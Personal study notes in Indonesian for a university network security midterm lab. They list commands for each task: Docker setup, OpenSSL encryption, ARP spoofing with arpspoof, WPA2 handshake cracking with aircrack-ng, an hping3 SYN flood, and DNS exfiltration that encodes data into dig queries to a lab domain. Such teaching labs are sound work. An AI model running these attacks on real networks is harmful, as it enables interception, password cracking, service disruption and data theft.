# UTS Network Security - Panduan Cepat (Kasus 3)

Catatan pribadi ringkas untuk mengulang/mereproduksi pengerjaan UTS ini.

---

## 1. Penentuan Kasus

- NIM: 24552011337
- Digit: 2, 4, 5, 5, 2, 0, 1, 1, 3, 3, 7
- Jumlah digit: 33
- Sisa bagi 10: 33 mod 10 = **3**
- **Kasus: 3**

Parameter Kasus 3: container target `target-k3`, volume `vol-k3`, file laporan `laporan-k3.txt`, kata sandi `kunci-k3-2026`, domain DNS `k3.exfil.lab`.

Materi referensi mata kuliah: `https://github.com/yastiaisyah/Network-Security-Course-Bank`

---

## 2. Struktur Folder Kerja Lokal

```
C:\lab-k3\            -> Tugas 1 (volume & compose dasar)
C:\lab-k3-arp\        -> Tugas 3 (ARP spoofing: gateway, victim, attacker)
C:\lab-k3-wifi\       -> Tugas 4 (handshake-k3.cap, wordlist-k3.txt)
C:\lab-k3-icmp\       -> Tugas 5 (Scapy, kirim_icmp.py)
C:\lab-k3-syn\        -> Tugas 6 (SYN flood, uts-kali-tools)
C:\lab-k3-dns\        -> Tugas 7 (DNS exfiltration, uts-dnsmasq)
```

Image custom yang dibuild sekali dan dipakai ulang:
- `uts-kali-tools` (dari Dockerfile: hping3, tcpdump, dig, aircrack-ng, scapy, dll — dipakai Tugas 6 & 7)
- `uts-dnsmasq` (DNS server untuk Tugas 7)

---

## 3. Ringkasan Perintah per Tugas

### Tugas 1 — Docker, Volume, Compose
```
docker volume create vol-k3
docker run -v vol-k3:/data --name writer-k3 alpine sh -c "echo 24552011337 > /data/laporan-k3.txt"
docker rm writer-k3
docker run --rm -v vol-k3:/data alpine cat /data/laporan-k3.txt

docker compose up -d
docker exec attacker-k3 curl -s http://target-k3
```

### Tugas 2 — Kriptografi
```
sha256sum /data/laporan-k3.txt
openssl enc -aes-256-cbc -salt -pbkdf2 -in /data/laporan-k3.txt -out /data/laporan-k3.enc -k kunci-k3-2026
openssl enc -d -aes-256-cbc -pbkdf2 -in /data/laporan-k3.enc -out /data/laporan-k3-dekrip.txt -k kunci-k3-2026
sha256sum /data/laporan-k3-dekrip.txt

openssl req -x509 -newkey rsa:2048 -keyout /data/key-k3.pem -out /data/cert-k3.pem -days 365 -nodes -subj "/CN=k3.exfil.lab"
openssl x509 -in /data/cert-k3.pem -noout -subject -issuer
```

### Tugas 3 — ARP Spoofing
```
docker exec -it victim-k3 sh
ping -c 3 172.28.100.2
ip neigh show                    # sebelum

docker exec -it attacker-k3 sh
arpspoof -i eth0 -t 172.28.100.10 172.28.100.2   # serangan

# di victim lagi:
ip neigh show                    # sesudah (MAC berubah)
ip neigh replace 172.28.100.2 lladdr da:c9:bc:b1:b9:f7 dev eth0 nud permanent
ip neigh show                    # mitigasi (PERMANENT)
```

### Tugas 4 — WPA2 Handshake
```
docker run -it --rm -v C:\lab-k3-wifi:/data kalilinux/kali-rolling bash
apt update && apt install -y aircrack-ng
aircrack-ng -w /data/wordlist-k3.txt /data/handshake-k3.cap
```

### Tugas 5 — ICMP Scapy
```
docker exec -it attacker-k3-icmp bash
python3 kirim_icmp.py 172.30.100.10
```

### Tugas 6 — SYN Flood
```
docker exec target-k3 sh -c "netstat -ant | grep -c SYN_RECV"     # sebelum
docker exec -it attacker-k3-syn bash
timeout 15 hping3 -S -p 80 --flood target-k3                       # serangan
# (loop netstat di jendela lain untuk tangkap angka saat serangan)

tcpdump -i eth0 -c 10 host target-k3 and port 80 -w /work/capture.pcap &
curl -s http://target-k3 > /dev/null
tcpdump -r /work/capture.pcap -n
```

### Tugas 7 — DNS Exfiltration
```
docker exec -it attacker-k3-dns bash
echo -n 24552011337 | xxd -p
dig +short <hex>.k3.exfil.lab @dns-k3

docker compose logs dns > dns-k3.log
docker cp dns-k3.log attacker-k3-dns:/work/dns-k3.log
python3 analisis_dns.py dns-k3.log
echo <hex> | xxd -r -p
```

---

## 4. Cleanup Setelah Selesai

```
bash cleanup.sh
```
atau manual:
```
docker compose down -v     # di tiap folder lab-k3-*
docker ps -a
docker network ls
docker volume ls
```

---

## 5. Checklist Sebelum Kumpulkan

- [ ] Semua 7 Tugas dikerjakan dan ada bukti screenshot
- [ ] `jawaban.md` berisi NIM, perhitungan kasus, dan penjelasan sendiri
- [ ] Semua container, network, volume UTS sudah dihapus (`cleanup.sh`)
- [ ] File dikumpulkan lewat e-learning sebelum deadline
